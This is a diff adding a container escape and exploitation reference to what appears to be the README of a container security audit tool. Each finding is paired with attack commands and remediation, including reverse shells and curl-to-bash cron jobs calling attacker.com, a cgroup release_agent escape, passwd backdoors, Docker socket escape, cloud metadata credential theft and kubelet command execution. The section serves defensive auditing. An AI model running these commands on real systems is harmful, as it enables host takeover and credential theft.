@@ -297,6 +297,459 @@ The report is intended to be handed directly to a remediation team. Each recomme
 
 ---
 
+## 🔓 Container Escape & Exploitation Reference
+
+> **Purpose:** Documents what an attacker could do if each check returns a finding, so you understand the real-world impact and can prioritise remediation.
+>
+> ⚠️ **Disclaimer:** For authorised security testing and defensive purposes only. Use this information solely to assess and harden your own infrastructure.
+
+---
+
+<details>
+<summary><h3>Container Configuration</h3></summary>
+
+#### Check 1 — Privileged Container (`--privileged`) `CRITICAL`
+
+A privileged container has full access to the host kernel and all devices. Escape is trivial:
+
+```bash
+# Mount the host root filesystem
+mkdir /tmp/host && mount /dev/sda1 /tmp/host
+
+# Chroot into the host
+chroot /tmp/host bash
+
+# Or write a reverse shell into the host crontab
+echo '* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1' \
+  >> /tmp/host/etc/crontab
+```
+
+**Remediation:** Remove `--privileged`. Use `securityContext.capabilities` to grant only the specific capabilities the workload requires.
+
+---
+
+#### Check 2 — Dangerous Linux Capabilities `HIGH`
+
+| Capability | Exploit Path |
+|---|---|
+| `CAP_SYS_ADMIN` | Mount filesystems, load kernel modules, use `ptrace` on any process |
+| `CAP_SYS_PTRACE` | Attach to any host process via `ptrace`, inject shellcode |
+| `CAP_SYS_MODULE` | Load a malicious kernel module (`insmod rootkit.ko`) |
+| `CAP_NET_ADMIN` | Reroute traffic, ARP spoofing, modify host iptables rules |
+| `CAP_DAC_OVERRIDE` | Bypass all filesystem permission checks |
+
+```bash
+# With CAP_SYS_PTRACE — enter all host namespaces via PID 1
+nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+```
+
+**Remediation:** Drop all capabilities and add back only what is needed:
+
+```yaml
+securityContext:
+  capabilities:
+    drop: ["ALL"]
+    add: ["NET_BIND_SERVICE"]  # example: only add what's required
+```
+
+---
+
+#### Check 3 — Host Namespace Sharing `HIGH`
+
+```bash
+# hostPID: true — enumerate and ptrace host processes
+ps aux
+nsenter -t 1 -m -u -i -n -p -- bash   # full host shell via PID 1
+
+# hostNetwork: true — bind to host ports, sniff traffic
+tcpdump -i eth0
+
+# hostIPC: true — read/write host shared memory segments
+ipcs -a
+```
+
+**Remediation:** Explicitly disable all host namespace sharing in the pod spec:
+
+```yaml
+spec:
+  hostPID: false
+  hostNetwork: false
+  hostIPC: false
+```
+
+---
+
+#### Check 11 — Seccomp / AppArmor / SELinux Disabled `MEDIUM`
+
+Without syscall filtering, dangerous kernel interfaces are fully exposed:
+
+```bash
+# Exploit kernel vulnerabilities requiring unfiltered syscalls
+# e.g. namespace escape via unshare
+unshare -UrmC --fork bash
+```
+
+**Remediation:** Apply the `RuntimeDefault` seccomp profile and enforce AppArmor/SELinux profiles on nodes:
+
+```yaml
+securityContext:
+  seccompProfile:
+    type: RuntimeDefault
+```
+
+</details>
+
+---
+
+<details>
+<summary><h3>Filesystem and Mounts</h3></summary>
+
+#### Check 4 — Dangerous Host Filesystem Mounts `CRITICAL`
+
+```bash
+# If the Docker socket is mounted — instant host root
+docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine \
+  chroot /host bash
+
+# If /etc is mounted writable — add a root user to the host
+echo 'backdoor::0:0::/root:/bin/bash' >> /etc/passwd
+su backdoor
+
+# If / is mounted — chroot directly to host
+chroot /host-mount bash
+```
+
+**Remediation:** Never mount the Docker or containerd socket into containers. For any required mounts, use `readOnly: true`:
+
+```yaml
+volumeMounts:
+  - name: config
+    mountPath: /etc/app-config
+    readOnly: true
+```
+
+---
+
+#### Check 5 — `/proc` Filesystem Exposure `CRITICAL`
+
+```bash
+# core_pattern exploit — execute arbitrary code on the host kernel
+echo '|/tmp/payload' > /proc/sys/kernel/core_pattern
+# Trigger a crash to execute /tmp/payload in the host context
+
+# Read credentials and tokens from host process environment
+cat /proc/1/environ | tr '\0' '\n'
+
+# Crash or reboot the host via sysrq
+echo b > /proc/sysrq-trigger
+```
+
+**Remediation:** Use a PID namespace so `/proc` reflects only container processes. Mount `/proc/sys` read-only. Deny writes via seccomp.
+
+---
+
+#### Check 8 — Writable Cron Directories `HIGH`
+
+```bash
+# Drop a root cron job that phones home
+echo '* * * * * root curl http://attacker.com/shell.sh | bash' \
+  > /etc/cron.d/backdoor
+```
+
+**Remediation:** Cron directories should never be writable at runtime. Enforce a read-only root filesystem:
+
+```yaml
+securityContext:
+  readOnlyRootFilesystem: true
+```
+
+---
+
+#### Check 9 — Writable Authentication Files `CRITICAL`
+
+```bash
+# Add a passwordless root account
+echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
+su pwned
+
+# Grant passwordless sudo to all users
+echo 'ALL ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers
+```
+
+**Remediation:** These files must never be writable inside a container. Use `readOnlyRootFilesystem: true`. If runtime writes are needed elsewhere, use an `emptyDir` for those specific paths only.
+
+---
+
+#### Check 13 — SUID/SGID Binaries `MEDIUM`
+
+```bash
+# Find SUID binaries in the container
+find / -perm -4000 -type f 2>/dev/null
+
+# Classic SUID escape — see gtfobins.github.io for full list
+# Example: if /usr/bin/find has SUID bit set
+find . -exec /bin/bash -p \; -quit
+```
+
+**Remediation:** Strip SUID/SGID bits during the image build:
+
+```dockerfile
+RUN find / -xdev -perm /6000 -type f -exec chmod a-s {} \;
+```
+
+---
+
+#### Check 17 — Writable Dynamic Linker Config `HIGH`
+
+```bash
+# Inject a malicious shared library — loaded before everything else
+echo '/tmp/evil_lib' > /etc/ld.so.preload
+# All subsequent privileged binary executions load your library first
+```
+
+**Remediation:** Use `readOnlyRootFilesystem: true`. Ensure `/etc/ld.so.preload` and `/etc/ld.so.conf.d/` are never writable inside the container.
+
+---
+
+#### Check 23 — OverlayFS Upper Directory Writability `MEDIUM`
+
+With access to the OverlayFS upper layer, an attacker can modify files that appear read-only inside the container, or inspect the layers of co-located containers.
+
+**Remediation:** Restrict access to the container runtime's storage directories on the host (`/var/lib/docker`, `/var/lib/containerd`). Ensure container processes cannot reach the host storage path.
+
+</details>
+
+---
+
+<details>
+<summary><h3>Kernel</h3></summary>
+
+#### Check 10 — `/dev/mem` Access and ptrace Scope `CRITICAL`
+
+```bash
+# /dev/mem exposes raw physical memory — read kernel secrets or patch running code
+dd if=/dev/mem bs=1 skip=$((0x100000)) count=1024 | strings
+
+# ptrace_scope=0 allows any process to attach to any other
+# Attach to a privileged host process and overwrite its memory
+```
+
+**Remediation:** Ensure `/dev/mem` is not accessible in the container. Set `kernel.yama.ptrace_scope=1` (or higher) on all nodes. Block `ptrace` via seccomp.
+
+---
+
+#### Check 12 — cgroup v1 `release_agent` Escape `CRITICAL`
+
+A well-known escape requiring only write access to a cgroup filesystem:
+
+```bash
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+
+# Write the payload path for the host to execute
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+# Payload executes on the host when the cgroup empties
+echo '#!/bin/sh' > /cmd
+echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /cmd
+chmod +x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+**Remediation:** Migrate to cgroup v2 (`--cgroupns=private`). Block `mount` syscalls via seccomp. Ensure containers cannot mount cgroup filesystems.
+
+---
+
+#### Check 14 — Kernel CVEs `HIGH`
+
+| CVE | Kernels Affected | Impact |
+|---|---|---|
+| **DirtyPipe** CVE-2022-0847 | 5.8 – 5.16.11 | Overwrite read-only files (e.g. `/etc/passwd`) via the `pipe` splice mechanism |
+| **DirtyCOW** CVE-2016-5195 | < 4.8.3 | Race condition in copy-on-write allows writing to read-only memory-mapped files |
+
+Public PoC code exists for both. Exploitation leads to local privilege escalation to root on the host.
+
+**Remediation:** Patch the host kernel. Verify with `uname -r`. Integrate a node OS scanner (Trivy, Grype) into your CI/CD pipeline.
+
+---
+
+#### Check 19 — cgroup v2 Writability `MEDIUM`
+
+Writable cgroup v2 interfaces can enable resource exhaustion attacks. In certain configurations, `ebpf`-based hooks attached via cgroup may also be abused.
+
+**Remediation:** Mount cgroup2 read-only where possible. Restrict `CAP_SYS_ADMIN`, which is required for most cgroup manipulation.
+
+---
+
+#### Check 22 — Kernel Module Loading `INFO`
+
+If module loading is enabled and `CAP_SYS_MODULE` is available:
+
+```bash
+# Load a rootkit directly into the host kernel
+insmod /tmp/rootkit.ko
+```
+
+**Remediation:** Set `kernel.modules_disabled=1` on hardened nodes. Deny `CAP_SYS_MODULE` in all Pod Security Admission policies.
+
+</details>
+
+---
+
+<details>
+<summary><h3>Kubernetes and Cloud</h3></summary>
+
+#### Check 6 — Service Account Token & RBAC `HIGH–CRITICAL`
+
+```bash
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+APISERVER=https://kubernetes.default.svc
+
+# Enumerate what this token can do
+curl -s -H "Authorization: Bearer $TOKEN" \
+  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews
+
+# If the token has secrets access — dump all secrets in the namespace
+curl -s -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets
+
+# If the token has pod/create — launch a privileged escape pod
+curl -s -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  $APISERVER/api/v1/namespaces/default/pods -d @evil-privileged-pod.json
+```
+
+**Remediation:**
+
+```yaml
+spec:
+  automountServiceAccountToken: false  # disable if not needed
+```
+
+Apply least-privilege RBAC. Use dedicated service accounts per workload. Audit permissions with `kubectl auth can-i --list`.
+
+---
+
+#### Check 7 — Environment Variable Secret Leakage `MEDIUM`
+
+```bash
+# Secrets passed as env vars are trivially readable
+printenv
+
+# Also visible via /proc even if the app doesn't expose them
+cat /proc/1/environ | tr '\0' '\n'
+```
+
+**Remediation:** Mount secrets as files rather than env vars. Better still, use an external secrets manager (HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager). Rotate any exposed credentials immediately.
+
+---
+
+#### Check 15 — Cloud Instance Metadata Service (IMDS) Reachable `CRITICAL`
+
+```bash
+# AWS — retrieve node IAM role credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+# Returns AccessKeyId, SecretAccessKey, SessionToken — immediately usable with AWS CLI
+
+# GCP — retrieve service account OAuth token
+curl -H "Metadata-Flavor: Google" \
+  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure — retrieve managed identity token
+curl -H "Metadata:true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+```
+
+**Remediation:**
+- **AWS:** Enforce IMDSv2 on all nodes (requires a signed `PUT` request — not accessible via simple `curl`)
+- **GCP/Azure:** Use Workload Identity instead of node-level credentials
+- **All:** Block IMDS access from pods via `NetworkPolicy` if containers don't require it
+
+---
+
+#### Check 16 — Kubelet API Exposed Unauthenticated `CRITICAL`
+
+```bash
+# Port 10250 — if anonymous auth is enabled
+curl -sk https://<node-ip>:10250/pods          # list all pods on the node
+
+# Execute commands in any container on the node — no kubeconfig needed
+curl -sk https://<node-ip>:10250/run/<namespace>/<pod>/<container> \
+  -d "cmd=cat /etc/shadow"
+
+# Port 10255 (read-only, no auth required)
+curl http://<node-ip>:10255/pods               # full pod spec disclosure
+```
+
+**Remediation:** Set `--anonymous-auth=false` and `--authorization-mode=Webhook` on the kubelet. Restrict access to ports 10250/10255 via firewall rules or security groups — only the control plane should reach these ports.
+
+---
+
+#### Check 20 — Secret Mount Directories `HIGH`
+
+```bash
+# Service account token and CA cert
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+# Any mounted Kubernetes Secrets
+ls /run/secrets/
+cat /run/secrets/db-password
+```
+
+**Remediation:** Only mount secrets in pods that require them. Use projected service account tokens with short expiry:
+
+```yaml
+volumes:
+  - name: token
+    projected:
+      sources:
+        - serviceAccountToken:
+            expirationSeconds: 3600
+            path: token
+```
+
+</details>
+
+---
+
+<details>
+<summary><h3>Host Access</h3></summary>
+
+#### Check 18 — Namespace Escape Tooling Present `MEDIUM`
+
+```bash
+# nsenter — enter host namespaces directly via PID 1
+# (requires hostPID:true or CAP_SYS_PTRACE)
+nsenter -t 1 -m -u -i -n -p -- bash
+
+# runc — if the container runtime socket is also accessible
+runc --root /var/run/runc run escape
+
+# crictl — list and exec into any container on the node
+crictl ps
+crictl exec -it <container-id> bash
+```
+
+**Remediation:** Keep container images minimal — these tools should never be present in production workloads. Use distroless or scratch-based base images. Enforce image scanning in CI to catch unexpected binaries.
+
+---
+
+#### Check 21 — SSH Private Keys Readable `HIGH`
+
+```bash
+# Search for private keys
+find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null
+
+# Use the key to pivot to other internal systems
+ssh -i /found/key user@internal-host
+```
+
+**Remediation:** Never bake SSH keys into container images — audit image layers with `docker history` or Trivy. Use short-lived certificates (Vault SSH Secrets Engine, AWS EC2 Instance Connect) instead of long-lived static keys. Revoke any keys found exposed.
+
+</details>
+
 ## Integration
 
 ### Falco (runtime detection complement)
